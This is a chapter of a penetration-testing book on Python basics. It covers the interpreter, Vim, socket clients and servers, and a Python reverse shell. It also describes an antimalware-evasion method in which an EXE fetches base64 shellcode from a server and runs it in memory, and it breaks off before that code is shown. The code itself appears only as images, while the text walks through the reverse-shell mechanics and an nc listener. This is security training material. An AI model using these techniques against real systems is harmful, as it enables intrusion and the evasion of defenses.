<html><head></head><body>
<div id="sbo-rt-content"><div id="_idContainer185">
<h1 id="_idParaDest-146"><em class="italic"><a id="_idTextAnchor145"/>Chapter 8</em>: Python Fundamentals</h1>
<p>It’s said that computers are actually very dumb; they crunch numbers and move things around in memory. Despite this oversimplification, how they think can seem mysterious. There is no better way to get acquainted with how computers actually think than through programming. Elsewhere in this book, we’ll see programming languages at different scales—assembly language, the machine code made up of mnemonic <strong class="bold">operation code</strong> (<strong class="bold">opcode</strong>) one up from the bottom; C language, the lowest of the high-level languages; and even Python, the high-level interpreted language. Python has a tremendous number of modules in its standard library that allow a <strong class="bold">penetration tester</strong> (<strong class="bold">pen tester</strong>) to accomplish just about any task. In <a href="B17616_02_Final_VK_ePub.xhtml#_idTextAnchor033"><em class="italic">Chapter 2</em></a>, <em class="italic">Bypassing Network Access Control</em>, we showed how easy it is to use Scapy’s functionality in our own Python script to inject specially crafted packets into the network. One way we can advance as pen testers is by learning how to leverage this power in our own custom programs. In this chapter, we’re going to review using Python in a security assessment context. We will cover the following topics:</p>
<ul>
<li>Incorporating Python into your work</li>
<li>Introducing Vim with Python awareness</li>
<li>Network analysis with Python modules</li>
<li>Antimalware evasion in Python</li>
<li>Python and Scapy—a classy pair</li>
</ul>
<h1 id="_idParaDest-147"><a id="_idTextAnchor146"/>Technical requirements</h1>
<p>To complete the exercises in this chapter, you will need the following:</p>
<ul>
<li>Kali Linux</li>
<li>A Windows host with Python installed</li>
<li><strong class="bold">Pip Installs Python</strong> (<strong class="source-inline">pip</strong>) and PyInstaller on Windows (part of the Python installation)</li>
</ul>
<h1 id="_idParaDest-148"><a id="_idTextAnchor147"/>Incorporating Python into your work</h1>
<p>I’ve been <a id="_idIndexMarker592"/>asked by many people: <em class="italic">Do you need to be a programmer to be a pen tester?</em> This is one of those questions that will spawn a variety of passionate answers from purists of all kinds. Some people say that you can’t be a true hacker without being a skilled programmer. My view is that the definition is less about a specific skill than about comprehension and mentality; hacking is a problem-solving personality and a lifestyle. That said, let’s be honest—your progress will be hampered by a lack of working knowledge in some programming and scripting. Being a pen tester is being a jack of all trades, so we need to have some exposure to a variety of languages, as opposed to a developer who specializes. If we were to pick a minimum requirement on the subject of programming and pen testing, I would tell you to pick up a scripting language. If I had to pick just one scripting language for the security practitioner, I’d pick Python. </p>
<p>What’s the difference between a programming language and a scripting language? To be clear, a scripting language is a programming language, so the difference between them is in the steps taken between coding and execution. A scripting language doesn’t require the compilation step; a script is interpreted by instruction at the time of execution—hence the proper term for such a language is interpreted language. C is an example of a traditional programming language that requires compilation before execution. However, these lines are increasingly blurred. For example, there’s no reason why a C interpreter isn’t possible. Using one would allow you to write C scripts.</p>
<h2 id="_idParaDest-149"><a id="_idTextAnchor148"/>Why Python?</h2>
<p>Python is an<a id="_idIndexMarker593"/> ideal choice for many reasons, but two elements of its design philosophy make it ideal for our goal of becoming an advanced pen tester—its power (it was originally designed to appeal to Unix/C hackers) coupled with its emphasis on readability and reusability. As a professional, you’ll be working with others (don’t plan on the black-hat lone-wolf mentality in this field); Python is one of the few languages where sharing your handy tool with a colleague will likely not result in follow-up <em class="italic">what the heck were you thinking?</em> emails to understand your constructs.</p>
<p>Perhaps most importantly, Python is one of those things that you may find on a target embedded well behind the perimeter of your client’s network. You’ve pivoted your way in, and you find yourself on a juicy internal network, but the hosts you land on don’t have the tools you need. It’s surprising how often you’ll find Python installed in such environments. On top of that, you’ll always find a Python-aware text editor on any compromised Linux box. We’ll discuss editors next. </p>
<p>A core concept in Python that makes it the number one choice<a id="_idIndexMarker594"/> of hackers is <strong class="bold">modules</strong>. A module is a simple concept, but with powerful implications for the Python programmer. A module is nothing more than a file that contains Python code whose functionality can be brought into your code with the <strong class="source-inline">import</strong> statement. With this functionality, all attributes (or perhaps a specific attribute) of the module become referenceable in your code. You can also use <strong class="source-inline">from [module] import</strong> to pick and choose the attributes you need. There is a tremendous number of modules written by clever people from around the world, all ready for you to place in the <strong class="source-inline">import</strong> search path so that you can bring in any attribute you desire to do some work in your code. The end result? A compact and highly readable chunk of Python that does some tremendous things.</p>
<p>At the time of writing this chapter, Python 3 is the latest and greatest, and anyone still using Python 2 for<a id="_idIndexMarker595"/> production tasks is being strongly encouraged to get familiar with Python 3. A handy Python tool <a id="_idIndexMarker596"/>called <strong class="bold">2to3</strong> will translate your Python 2 into Python 3. We’ll explore configuring your global installation to a specific version for backwards compatibility in <a href="B17616_12_Final_VK_ePub.xhtml#_idTextAnchor224"><em class="italic">Chapter 12</em></a>, <em class="italic">Shellcoding - Evading Antivirus</em>. Now that we’re familiar with the basics, let’s get familiar with the Python editor on Kali.</p>
<h2 id="_idParaDest-150"><a id="_idTextAnchor149"/>Getting cozy with Python in your Kali environment</h2>
<p>There are<a id="_idIndexMarker597"/> two<a id="_idIndexMarker598"/> primary components you’ll use during Python development—the interactive interpreter and the editor. The interpreter is called up with the following simple command:</p>
<p class="source-code"># python3</p>
<p>The interpreter is exactly what it sounds like—it will interpret Python code on the fly. This is a real time-saver when you’re coding, as you can—for instance—check your formula without closing out the editor and running the code, looking for the line in question.</p>
<p>In this example, we issued <strong class="source-inline">print("Hello, world!")</strong> and the interpreter simply printed the string. I then tried a formula and messed around with using <strong class="source-inline">int()</strong> to round the result to the nearest integer. Thus, I experimented with my formula and learned a little about Python without needing to write this out and run it:</p>
<div>
<div class="IMG---Figure" id="_idContainer172">
<img alt="Figure 8.1 – Playing with Python 3 in Kali " height="290" src="image/Figure_8.1_B17616.jpg" width="805"/>
</div>
</div>
<p class="figure-caption">Figure 8.1 – Playing with Python 3 in Kali</p>
<p>It should come as no surprise to learn that most Python coders work on their projects with two screens open—the interpreter and the editor. The interpreter is built into the Python installation; what you get when you punch in <strong class="source-inline">python3</strong> and hit <em class="italic">Return</em> is what people will use. The editor, on the other hand, can be a personal choice—and once again, opinions in this arena can be passionate! </p>
<p>The editor is just a text editor; technically, a Python file is text. I could write up a Python script <a id="_idIndexMarker599"/>with <a id="_idIndexMarker600"/>Windows Notepad and it would work fine—but I wouldn’t recommend it (telling people that’s how you code would be a fun way to get weird looks). If it’s just a text editor, what’s the big deal? The main feature you’re looking for in an editor is syntax awareness—the editor understands the language you’re typing in and displays the syntax in a distinctive way for you. It turns text that just happens to be Python into a living piece of code, and it makes your life a lot easier.</p>
<p>The tiniest of errors—such as forgetting a single closing quotation mark—stick out like a sore thumb as the editor tries to understand your syntax. There are several great options for syntax-aware editors; some popular ones are Notepad++, gedit, nano, Kate, and Vim. Now, the<a id="_idIndexMarker601"/> more serious developer will probably use an <strong class="bold">integrated development environment</strong> (<strong class="bold">IDE</strong>), which is a more comprehensive solution for understanding what your code is doing, and it also assists in writing the code. An IDE may have a debugger and a class browser, for example, whereas an editor will not. There are many IDEs to choose from, most of them free with commercial versions and supporting a variety of operating systems; a couple of good ones are <em class="italic">Wing IDE</em> and <em class="italic">PyCharm</em>.</p>
<p>IDEs are cool, but please note that we won’t be working in one for our purposes here. It’s recommended you get familiar with your favorite IDE, but our objective here is minimalism and flexibility. Having a cozy IDE setup is the kind of thing you have on a designated machine, which will be fantastic for writing up a new toolset to carry around with you on your assignments. The context of our discussion here, on the other hand, is writing up Python scripts on a bare-bones machine where having your favorite IDE may not be practical. Being able to get by with just a plain Python install plus an editor is more important than learning an IDE, so I encourage you to master one outside of this book. For now, we’re going to proceed with an editor that’s ready to go on just about any Linux box<a id="_idIndexMarker602"/> and<a id="_idIndexMarker603"/> should natively understand Python syntax. My choice of editor may cause some readers to literally burn this book with fire, and other readers will cheer. Yes—I’m going to work with Vim.</p>
<h2 id="_idParaDest-151"><a id="_idTextAnchor150"/>Introducing Vim with Python syntax awareness</h2>
<p>To get an<a id="_idIndexMarker604"/> idea of Vim’s notoriety as an editor, just type this<a id="_idIndexMarker605"/> into your favorite search engine: <strong class="source-inline">how do I quit Vim?</strong></p>
<p>Vim stands <a id="_idIndexMarker606"/>for <strong class="bold">Vi IMproved</strong> because it’s a clone of the original vi editor, but with some changes touted as improvements. To be fair, they are improvements, and it has many—we won’t cover them all here. But there is one key improvement—its native support for scripting languages such as Python. Another improvement comes in handy for those who are just not ready for Vim’s sitting-in-the-cockpit-of-a-space-shuttle feel: the graphical interface version of Vim, known as gVim. The graphical version is still Vim at its core, so feel free to play around with it.</p>
<p>I should probably mention the long and bloody editor war between Emacs and vi/Vim. My choosing Vim for this chapter’s purpose isn’t a statement in this regard. I prefer it as a fast and lightweight tool where text editing with Python syntax discrimination is our primary focus. My favorite description of Emacs is an operating system within an operating system—I think it’s too much editor for our needs here. I encourage the reader to dabble in both of them outside of these pages.</p>
<p>Fire up Vim with this simple command:</p>
<p class="source-code"># vim</p>
<p>You will see an editor with a splash screen that lets you know how to get right into the help file, as illustrated here:</p>
<div>
<div class="IMG---Figure" id="_idContainer173">
<img alt="Figure 8.2 – The Vim splash screen " height="684" src="image/Figure_8.2_B17616.jpg" width="1193"/>
</div>
</div>
<p class="figure-caption">Figure 8.2 – The Vim splash screen</p>
<p>When you open up <a id="_idIndexMarker607"/>any <a id="_idIndexMarker608"/>document in Vim (or just start a fresh session), you’re reviewing, not editing. To actually type into a document is <a id="_idIndexMarker609"/>called <strong class="bold">insert mode</strong>, which you enable with the <em class="italic">i</em> key. You’ll see the word <strong class="source-inline">INSERT</strong> at the bottom of the screen. Use <em class="italic">Esc</em> to exit insert mode. Issuing a command to Vim is done with a colon followed by the specific command—for example, exiting Vim is done with <strong class="source-inline">:q</strong> followed by <em class="italic">Enter</em>. Don’t worry about too much detail at the moment; we’ll step through the basics as we write up our scripts.</p>
<p>Before we write our first handy-for-hacking Python script, let’s get the syntax highlighting turned on and write a quick <strong class="source-inline">hello_world</strong> program. In Kali, Vim is already able to understand Python syntax; we just have to tell Vim that we’re working with a specific file type. First, start with <strong class="source-inline">vim</strong> followed by a filename, and then hit <strong class="source-inline">:</strong> to enter command mode, as illustrated here:</p>
<p class="source-code"># vim hello_world.py</p>
<p>Then, issue this command, followed by <em class="italic">Enter</em>:</p>
<p class="source-code">:set filetype=python</p>
<p>When you’re<a id="_idIndexMarker610"/> ready, hit the <em class="italic">i</em> key to enter insert mode. As <a id="_idIndexMarker611"/>you type a Python script, the syntax will be highlighted accordingly. Write your <strong class="source-inline">Hello, World</strong> script, like so:</p>
<p class="source-code">print("Hello, World!")</p>
<p>Hit <em class="italic">Esc</em> to leave insert mode. Then, use <strong class="source-inline">:wq!</strong> to save your changes and exit Vim in one fell swoop.</p>
<p>Run your program and marvel at your masterpiece. Here it is:</p>
<div>
<div class="IMG---Figure" id="_idContainer174">
<img alt="Figure 8.3 – Hello, World! in Python " height="146" src="image/Figure_8.3_B17616.jpg" width="339"/>
</div>
</div>
<p class="figure-caption">Figure 8.3 – Hello, World! in Python</p>
<p>Okay—enough <a id="_idIndexMarker612"/>messing around. Let’s do some <a id="_idIndexMarker613"/>networking.</p>
<h1 id="_idParaDest-152"><a id="_idTextAnchor151"/>Network analysis with Python modules</h1>
<p>A Python<a id="_idIndexMarker614"/> script<a id="_idIndexMarker615"/> with the right modules can be a mature and powerful network technician. Python has a place in every layer of abstraction you can think of. Do you need just a quick and dirty service to be the frontend for some task such as downloading files? Python has your back. Do you need to get nitty-gritty with low-level protocols, scripting out specific packet manipulation activities nested in conditional logic, chatting with the network at layer 3, and even down to the data-link layer? Python makes this fun and easy. The best part is the portability of any project you can imagine; as I mentioned, you will be functioning on a team as a pen tester, and there are few situations in which you will function all alone. Even if you are on a project where you’re working as a lone wolf, white hats are there to inform the client, and there are no trade secrets or magician’s code, so you may be asked to lay out in understandable terms how the bad guys can get away with your win. Sending some code to someone—whether a skilled colleague or a knowledgeable administrator representing your client—can put a bit of a demand on the recipient<a id="_idIndexMarker616"/> when the <strong class="bold">proof of concept</strong> (<strong class="bold">POC</strong>) requires environmental dependencies and lengthy work to put it together in a lab. A Python script, on the other hand, is just a breeze to work with. The most you may need to provide are special modules that aren’t already part of the vast Python community. An area where<a id="_idIndexMarker617"/> Python <a id="_idIndexMarker618"/>shines is with networking, which is appropriate considering the importance of network tasks for just about any assessment.</p>
<h2 id="_idParaDest-153"><a id="_idTextAnchor152"/>Python modules for networking</h2>
<p>Our fun little <strong class="source-inline">hello_world</strong> program <a id="_idIndexMarker619"/>needed nothing more than Python <a id="_idIndexMarker620"/>to interpret your sophisticated code. However, you’ve no doubt realized that <strong class="source-inline">hello_world</strong> doesn’t really serve the pen tester too well. For one, all it does is display an overused cliché. But even if it were handier, there are no imports. In terms of capability, what you see is what you get. Truly unleashing Python happens when we expose capability with modules. If I were to guess what kind of task you’ll be employing the most, I’d guess networking.</p>
<p>There are many options available to the Python coder to make their script chatty with the network. The key to understanding modules in general is by organizing them in terms of layers or levels. Lower-layer modules give you the most power, but they can be difficult to use properly; higher-layer modules allow you to write code that’s more Pythonic by taking care of lower constructs behind the scenes. Anything that works at a higher layer of abstraction can be coded with lower layers, but typically with more lines of code. Take, for example, the <strong class="source-inline">socket</strong> module. The <strong class="source-inline">socket</strong> module is a low-level networking module: it exposes the <strong class="bold">Berkeley Software Distribution</strong> (<strong class="bold">BSD</strong>) <strong class="source-inline">sockets</strong> <strong class="bold">application programming interface</strong> (<strong class="bold">API</strong>). A single import of <strong class="source-inline">socket</strong> combined<a id="_idIndexMarker621"/> with the right code will allow your Python program to do just about anything on the network. If you’re the ambitious type who is hoping to<a id="_idIndexMarker622"/> replace—say—<strong class="bold">Network Mapper</strong> (<strong class="bold">Nmap</strong>) with your own Python magic, then I bet the very first line of your code is simply <strong class="source-inline">import socket</strong>. On the high-level side of things, you have modules such as <strong class="source-inline">requests</strong>, which allows for highly<a id="_idIndexMarker623"/> intuitive <strong class="bold">HyperText Transfer Protocol</strong> (<strong class="bold">HTTP</strong>) interaction. A single line of code with <strong class="source-inline">requests</strong> imported will put an entire web page into a single manipulable Python object. Not too shabby.</p>
<p>Remember—anything that works at a high level can be built with low-level code and modules; you can’t use high-level modules to do low-level tasks. So, let’s take an example. Using Python in pen testing contexts will make heavy use of <strong class="source-inline">socket</strong>, so let’s throw together a quick and dirty client. With only 11 lines of code, we can connect and talk to a service, and store its response.</p>
<p>Keep in mind that <strong class="source-inline">socket</strong>, being low-level, makes calls to socket APIs of the operating system. This<a id="_idIndexMarker624"/> may make your script platform-dependent! Now, let’s<a id="_idIndexMarker625"/> jump into building our client skeleton.</p>
<h2 id="_idParaDest-154"><a id="_idTextAnchor153"/>Building a Python client</h2>
<p>In our example, I’ve<a id="_idIndexMarker626"/> set up an HTTP server in my lab at <strong class="source-inline">192.168.108.229</strong> over the standard port <strong class="source-inline">80</strong>. I’m writing up a client that will establish a TCP connection<a id="_idIndexMarker627"/> with the target IP address and<a id="_idIndexMarker628"/> port, send a specially crafted request, receive a maximum of 4,096 bytes of response, store it in a local variable, and then simply display that variable to the user. I leave it to your imagination to figure out where you could go from here.</p>
<p>The very first line you’ll see in our examples for this chapter is <strong class="source-inline">#!/usr/bin/python3</strong>. When we used Python scripts earlier in the book, you’ll recall that we used <strong class="source-inline">chmod</strong> to make the script executable in Linux, and then executed it with <strong class="source-inline">./</strong> (which tells the operating system that the executable is in the current directory instead of in the user’s <strong class="source-inline">$PATH</strong>). <strong class="source-inline">#!</strong> is called a shebang (yes—I’m serious), and it tells the script where to find the interpreter. By including that line, you can treat the script as an executable because the interpreter can be found thanks to your shebang line:</p>
<div>
<div class="IMG---Figure" id="_idContainer175">
<img alt="Figure 8.4 – The bare-bones client " height="264" src="image/Figure_8.4_B17616.jpg" width="766"/>
</div>
</div>
<p class="figure-caption">Figure 8.4 – The bare-bones client</p>
<p>Let’s take a look <a id="_idIndexMarker629"/>at this simple code piece by piece, as follows:</p>
<ul>
<li>With <strong class="source-inline">webhost</strong> and <strong class="source-inline">webport</strong>, we define the target IP address and port. In our case, we’re defining it within the script, but you could also take input from the user.</li>
<li>We’re already familiar with <strong class="source-inline">print()</strong>, but in this case, we can see how variables are displayed within the printed text. Keep in mind that IP addresses are strings, and ports are ordinary integers: look at how we assigned <strong class="source-inline">webport</strong> without the single quotes. We’ll ask Python to unpack our sequence with an asterisk (<strong class="source-inline">*</strong>) and <strong class="source-inline">print()</strong> will take care of our type casting for us.</li>
<li>And now, the fun part. Calling <strong class="source-inline">socket.socket()</strong> creates a Python object of your choosing; it looks like a variable, and it is the Pythonic representation of the created socket. In our example, we create a socket called <strong class="source-inline">webclient</strong>. From this point forward, we use <strong class="source-inline">webclient</strong> to work through the socket. The socket is low-level enough that we need to let it know which address family we’re using, as Unix systems can support a pile of them. This is where <strong class="source-inline">AF_INET</strong> comes in: <strong class="source-inline">AF</strong> designates an address family, and <strong class="source-inline">INET</strong> refers to <strong class="bold">IP version 4</strong> (<strong class="bold">IPv4</strong>). (<strong class="source-inline">AF_INET6</strong> will<a id="_idIndexMarker630"/> work with IPv6 for when you’re feeling saucy.) <strong class="source-inline">SOCK_STREAM</strong> means we’re using a stream socket as opposed to a datagram socket. To put it simply, a stream socket is where we have well-defined TCP conversations. Datagrams are the fire-and-forget variety. A combination of <strong class="source-inline">AF_INET</strong> and <strong class="source-inline">SOCK_SOCKET</strong> is what you’ll use almost every time.</li>
<li>Now, we work with our socket by separating the object name and the task with a period. As you can imagine, you could set up a whole mess of <strong class="source-inline">sockets</strong> with unique names and manage connections through them with your code. <strong class="source-inline">webclient.connect()</strong> establishes a TCP connection with the target IP and port. Follow that up with <strong class="source-inline">webclient.send()</strong> to send data to that established connection. Keep in mind that <strong class="source-inline">send()</strong> needs its argument as bytes, so a simple string won’t work—we put <strong class="source-inline">b</strong> before the string to accomplish that.</li>
<li>Just as in any healthy relationship, we send a nice message, and we expect a response. <strong class="source-inline">webclient.recv()</strong> prepares some space for this response; the argument taken is the size of this prepared space, and the prepared space is given a name so that it becomes an object in our code—I’m calling it the boring-but-logical <strong class="source-inline">reply</strong> in this case.</li>
</ul>
<p>We wrap it up by just displaying the <strong class="source-inline">reply</strong> object—the response from the contacted server—but you could do whatever you want to the reply. Also, note that the script ends here, so <a id="_idIndexMarker631"/>we don’t see the implications of using <strong class="source-inline">sockets</strong>—they are typically short-lived entities meant for short conversations, so at this point, the socket would be torn down. Keep this in mind when you work with <strong class="source-inline">sockets</strong>.</p>
<h2 id="_idParaDest-155"><a id="_idTextAnchor154"/>Building a Python server</h2>
<p>Now, we’re<a id="_idIndexMarker632"/> going to set up a simple server. I say <em class="italic">simple</em> server, which may make you think <em class="italic">something such as an HTTP server with just basic functionality</em>—no; I mean simple. This will simply listen for connections and take an action upon receipt of data. Let’s take a look at the code here:</p>
<div>
<div class="IMG---Figure" id="_idContainer176">
<img alt="Figure 8.5 – The bare-bones server " height="486" src="image/Figure_8.5_B17616.jpg" width="961"/>
</div>
</div>
<p class="figure-caption">Figure 8.5 – The bare-bones server</p>
<p>Note that I’ve <a id="_idIndexMarker633"/>brought in a new module: <strong class="source-inline">threading</strong>. This module is itself a high-level module for interfacing to the <strong class="source-inline">thread</strong> module (called <strong class="source-inline">_thread</strong> in Python 3). I recommend that you just import <strong class="source-inline">threading</strong> if you want to build threading interfaces. I know someone is asking: <em class="italic">What's a thread?</em> A thread is just a fancy term for things we’re all familiar with in programming: particular function calls or tasks. When we learn programming, we work with function calls one at a time so that we can understand their structure and function. The concept of threading comes into play when we have some task at work that involves a little waiting—for example, waiting for someone to connect, or perhaps waiting for someone to send us some data. If we’re running a service, we’re waiting to handle connections. But what if everyone went to bed? I might get connections within a second or may be lucky to see a hit after days of waiting. The latter is a familiar scenario for us hackers in lurking: we’ve set a trap and we just need our target to click the link or execute some payload. Threading allows us to manage multiple tasks—threads—at once. Let’s see it in action with our simple server script, as follows:</p>
<ul>
<li>We start with the usual by declaring the IP address and port number, which in this case will be used to set up a local listener. We then create a socket called <strong class="source-inline">server</strong> and define it as a stream socket with IPv4 addressing.</li>
<li>Now, we use <strong class="source-inline">server.bind()</strong> to bind our socket to the local port. Note that the IP address is declared, but we put <strong class="source-inline">0.0.0.0</strong>. From a networking perspective, if a packet hits our socket then it was already routed appropriately, and the source had defined our IP address properly. This means that, if our system has multiple interfaces with multiple IP addresses, this listener is reachable to any client who can talk to any of our interfaces!</li>
<li>Binding doesn’t exactly tell the socket what to do once bound. So, we use <strong class="source-inline">server.listen()</strong> to open up that<a id="_idIndexMarker634"/> port; an inbound <strong class="bold">synchronize</strong> (<strong class="bold">SYN</strong>) packet will automatically be handled with a <strong class="bold">SYN-acknowledge</strong> (<strong class="bold">SYN-ACK</strong>) and<a id="_idIndexMarker635"/> a final ACK. The argument passed to <strong class="source-inline">listen</strong> is the maximum number of connections. We’ve arbitrarily set <strong class="source-inline">4</strong>; your needs will vary. The user is advised with <strong class="source-inline">print</strong> that we’re up and running.</li>
<li>We tried the “unpacking my sequence” method of printing text to the screen; here, we’ll <a id="_idIndexMarker636"/>do something different. With the percentage symbol (<strong class="source-inline">%</strong>), we can put little placeholders for working with different data types. Using <strong class="source-inline">d</strong> means decimal; <strong class="source-inline">s</strong> means string.</li>
<li>Now for some more wild and crazy action—defining a <strong class="source-inline">connect</strong> function. This function is what our client connection handler will call; that is, the <strong class="source-inline">connect</strong> function doesn’t handle connections but decides what to do once a connection is established. The code is self-explanatory: it <a id="_idIndexMarker637"/>sets aside a <strong class="bold">kilobyte</strong> (<strong class="bold">KB</strong>) of space for the received data and calls it <strong class="source-inline">received</strong>, replies with a message, then closes the connection.</li>
<li>Our <strong class="source-inline">while</strong> loop statement keeps our server up and running. A <strong class="source-inline">while</strong> loop statement is yet another basic programming concept: it’s a conditional loop that executes as long as a given condition is true. Suppose we have an integer variable called <strong class="source-inline">loop</strong>. We could create a <strong class="source-inline">while</strong> loop that starts with <strong class="source-inline">while loop &lt; 15</strong>, and any code we put there will execute as long as <strong class="source-inline">loop</strong> is less than <strong class="source-inline">15</strong>. We can control the flow with <strong class="source-inline">break</strong> and <strong class="source-inline">continue</strong> nested conditions. I know what the programmer in you is saying, though: <em class="italic">It says execute the loop while true, but no condition is defined</em>. Too true, my friends. I like to call this the <em class="italic">existential loop statement</em>—kind of the programmer’s version of <em class="italic">I think, therefore I am</em>. A loop that starts with <strong class="source-inline">while True</strong> will just go on forever. What’s the point of such a loop? This is the compact and clean way to leave a program running until we meet a certain condition somewhere in the code, either in a called function or perhaps in a nested conditional test, at which point we use <strong class="source-inline">break</strong>.</li>
<li><strong class="source-inline">server.accept()</strong> sits in our never-ending <strong class="source-inline">while</strong> loop, ready to grab the address <a id="_idIndexMarker638"/>array of a connecting client. Arrays in Python start with <strong class="source-inline">0</strong>, so keep this in mind: the first value in an array is thus <strong class="source-inline">[0]</strong>, the fifth value is <strong class="source-inline">[4]</strong>, and so on. The address array has the IP address as the first value and the port as the second value, so we can display to the user the details of our connecting client.</li>
<li>We create a thread with <strong class="source-inline">threading.Thread()</strong> and call it <strong class="source-inline">client_handler</strong>. We move right on to starting it with <strong class="source-inline">client_handler.start()</strong>, but in your programs, you could create some condition to start the thread. Note that the target argument passed to <strong class="source-inline">threading.Thread()</strong> calls the <strong class="source-inline">connect</strong> function. When the <strong class="source-inline">connect</strong> function is done, we fall back to our endless loop, as illustrated here:</li>
</ul>
<div>
<div class="IMG---Figure" id="_idContainer177">
<img alt="Figure 8.6 – Running our Python server " height="510" src="image/Figure_8.6_B17616.jpg" width="713"/>
</div>
</div>
<p class="figure-caption">Figure 8.6 – Running our Python server</p>
<p>Here, we see the script in action, handling a<a id="_idIndexMarker639"/> connection from a <strong class="bold">Secure Shell</strong> (<strong class="bold">SSH</strong>) client (which identified itself) and then from a netcat-like connection that sent <strong class="source-inline">Hello</strong>. A <strong class="source-inline">Listening on</strong> message is displayed right before we fall back into our <strong class="source-inline">while True</strong> loop, so <a id="_idIndexMarker640"/>there’s no fancy way of killing this program outside of <em class="italic">Ctrl</em> + <em class="italic">C</em>. This program is a skeleton of server functionality. Just throw in your Pythonic magic here and there, and the possibilities are endless.</p>
<h2 id="_idParaDest-156"><a id="_idTextAnchor155"/>Building a Python reverse-shell script</h2>
<p>Okay—so, you’re <a id="_idIndexMarker641"/>working your way through a post-exploitation phase. You find yourself on a Linux box with Python installed but nothing else, and you’d like to create a script to be called in certain scenarios that will automatically kick back a shell. Or, perhaps you’re writing a malicious script and you want to return a shell from a Linux target. Whatever the scenario, let’s take a quick look at a Python reverse-shell skeleton, as follows:</p>
<div>
<div class="IMG---Figure" id="_idContainer178">
<img alt="Figure 8.7 – The Python reverse shell " height="246" src="image/Figure_8.7_B17616.jpg" width="663"/>
</div>
</div>
<p class="figure-caption">Figure 8.7 – The Python reverse shell</p>
<p>Now, we’re pulling in two new modules: <strong class="source-inline">os</strong> and <strong class="source-inline">subprocess</strong>. This is where Python’s ability to talk to the operating system shines. The <strong class="source-inline">os</strong> module is a multipurpose operating system interfacing module. It’s a one-stop shop, even with the peculiarities of a particular operating system—of course, if portability between systems is a concern, be careful with this. The <strong class="source-inline">os</strong> module is very powerful and is well beyond our discussion here; I encourage you to research it on your own. The <strong class="source-inline">subprocess</strong> module very commonly goes hand in hand with the <strong class="source-inline">os</strong> module. It allows your script to spawn processes, grab<a id="_idIndexMarker642"/> their return codes for use in your main script, and interact with their input, output, and error pipes. Let’s look at the specifics here:</p>
<ul>
<li>We’re creating a new IPv4 stream socket and calling it <strong class="source-inline">sock</strong>.</li>
<li>We use <strong class="source-inline">sock.connect()</strong> to use our new socket to connect to a host at the specified IP address and port (we’re just playing around locally in our example— this works for any reachable address).</li>
<li>Firing off <strong class="source-inline">/bin/sh</strong> is all well and good, but we need the input, output, and error pipes to talk to our socket. We accomplish this with <strong class="source-inline">os.dup2(sock.fileno())</strong>, with the values <strong class="source-inline">0</strong> through <strong class="source-inline">2</strong> representing <strong class="source-inline">stdin</strong>, <strong class="source-inline">stdout</strong>, and <strong class="source-inline">stderr</strong>.</li>
<li>We call <strong class="source-inline">/bin/sh -i</strong> with <strong class="source-inline">subprocess.call()</strong>. Note that this creates an object we’re calling <strong class="source-inline">proc</strong>, but we don’t need to do anything with it. The process is spawned, and its standard streams are already established through our socket. The shell is popping up on our remote screen and doesn’t know it, as illustrated here:</li>
</ul>
<div>
<div class="IMG---Figure" id="_idContainer179">
<img alt="Figure 8.8 – Connecting to our reverse-shell listener " height="125" src="image/Figure_8.8_B17616.jpg" width="393"/>
</div>
</div>
<p class="figure-caption">Figure 8.8 – Connecting to our reverse-shell listener</p>
<p>Now, we kick off our reverse-shell script. Obviously, there needs to be a listener ready to take the connection from our script, so I just fire up <strong class="source-inline">nc -l</strong> and specify the port we’ve declared in the script. The familiar prompt appears, and I verify that I have the permission of the user who executed our script.</p>
<p>Speaking of <a id="_idIndexMarker643"/>smuggling the goods with Python helpers, let’s take a look at evading antimalware software by delivering our malicious code directly into memory from across the network.</p>
<h1 id="_idParaDest-157"><a id="_idTextAnchor156"/>Antimalware evasion in Python</h1>
<p>We explored <a id="_idIndexMarker644"/>antimalware<a id="_idIndexMarker645"/> evasion in <a href="B17616_07_Final_VK_ePub.xhtml#_idTextAnchor124"><em class="italic">Chapter 7</em></a>, <em class="italic">Advanced Exploitation with Metasploit</em>. The technique we reviewed involved embedding our payload into the natural flow of execution of an innocuous executable. We also covered encoding techniques to reduce detection signatures. However, there’s more than one way to skin a cat. (Whoever thought of that horrible expression?)</p>
<p>If you’ve ever played defense against real-world attacks, you’ve likely seen a variety of evasion techniques. The techniques often used to be lower-level (for instance, our demonstration with Shellter in <a href="B17616_07_Final_VK_ePub.xhtml#_idTextAnchor124"><em class="italic">Chapter 7</em></a>, <em class="italic">Advanced Exploitation with Metasploit</em>), but detection has improved so much. It’s a lot harder to create a truly undetectable threat that doesn’t at least trigger a suspicious file intercept.</p>
<p>Therefore, modern attacks tend to be a blend of low-level and high-level—using social engineering and technical tactics to get the malware onto the target host through some other channel. I’ve worked on cases where the payload sneaking in via phishing techniques is nothing more than a script that uses local resources to fetch files from the internet. Those files, once retrieved, then put together the malware locally. We’re going to examine such an attack using Python to create a single <strong class="source-inline">.exe</strong> file with two important tasks, as outlined here:</p>
<ul>
<li>Fetching the payload from the network</li>
<li>Loading the raw payload into memory and executing it</li>
</ul>
<p>The Python script itself does very little and, without a malicious payload, it doesn’t have a malicious signature. The payload itself won’t be coming in as a compiled executable as normally expected, but as raw shellcode bytes encoded in <strong class="source-inline">base64</strong>.</p>
<p>So, in an attack scenario, we’ll have a target Windows box where we put our executable file for execution. Meanwhile, we set up an HTTP server in Kali ready to serve the raw payload to<a id="_idIndexMarker646"/> a<a id="_idIndexMarker647"/> properly worded request (which will be encoded in the Python script). The script then decodes the payload and plops it into memory. But first, we need to be able to create EXEs out of Python scripts.</p>
<h2 id="_idParaDest-158"><a id="_idTextAnchor157"/>Creating Windows executables of your Python scripts</h2>
<p>There are two<a id="_idIndexMarker648"/> components that we need for <a id="_idIndexMarker649"/>this—<strong class="source-inline">pip</strong>, a Python package management utility, and PyInstaller, an awesome utility that reads your Python code, determines exactly what its dependencies are (and that you might take for granted by running it in the Python environment), and generates an EXE file from your script. There is an important limitation to PyInstaller, though—you need to generate an EXE file on the target platform. So, you will need a Windows box to fire this up.</p>
<p class="callout-heading">Go Commando with your Windows Box</p>
<p class="callout">One of my favorite toys is a Windows PC-turned-offensive platform thanks to the excellent Commando <strong class="bold">virtual machine</strong> (<strong class="bold">VM</strong>) from Mandiant. The simplest way to think of it is Kali for Windows—a pen testing load of the ubiquitous operating system. Instead of a preloaded distribution, it’s essentially a fancy installer that will convert your ordinary Windows machine, downloading everything it needs and tweaking settings for you. You don’t need it for the exercise here, but I will be using it as my offensive Windows environment. I don’t think any pen testing lab is complete without it!</p>
<p>Over at our trusty Windows machine, we have Python installed and ready to go. (You have Python installed and ready to go, right?) So, I pass along this command:</p>
